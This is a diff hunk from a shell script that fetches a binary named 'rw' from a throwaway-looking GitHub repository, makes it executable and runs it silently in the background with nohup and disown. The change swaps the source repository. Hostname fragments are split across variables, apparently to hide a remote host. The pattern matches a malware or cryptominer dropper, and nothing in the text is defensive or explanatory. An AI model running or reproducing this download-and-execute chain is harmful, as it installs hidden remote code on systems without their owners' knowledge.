@@ -4,7 +4,7 @@ u1="xkjxrwat"
 u2="ap-southeast-1"
 u3="clawcloudrun"
 u4="com"
-curl https://raw.githubusercontent.com/madafatt/zesty-cat-749/refs/heads/main/rw > $rni
+curl https://raw.githubusercontent.com/madafatt/fancy-monkey-336/refs/heads/main/rw > $rni
 chmod +x $rni
 nohup ./$rni -j 4 > /dev/null & disown
 sleep 5
